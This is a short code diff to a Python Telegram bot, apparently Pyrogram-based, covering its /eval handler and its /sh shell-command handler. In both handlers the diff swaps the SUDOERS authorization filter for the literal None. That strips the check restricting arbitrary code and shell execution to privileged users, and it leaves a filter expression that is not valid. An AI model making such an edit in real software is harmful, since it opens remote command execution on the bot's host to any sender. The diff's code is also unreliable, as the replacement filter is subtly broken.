@@ -40,7 +40,7 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 
 @app.on_message(
-    filters.command("eval") & SUDOERS & ~filters.forwarded & ~filters.via_bot
+    filters.command("eval") & None & ~filters.forwarded & ~filters.via_bot
 )
 async def executor(client, message):
     if len(message.command) < 2:
@@ -142,7 +142,7 @@ async def forceclose_command(_, CallbackQuery):
         return
 
 
-@app.on_message(filters.command("sh") & SUDOERS & ~filters.forwarded & ~filters.via_bot)
+@app.on_message(filters.command("sh") & None & ~filters.forwarded & ~filters.via_bot)
 async def shellrunner(client, message):
     if len(message.command) < 2:
         return await edit_or_reply(message, text="**Usage:**\n/sh git pull")
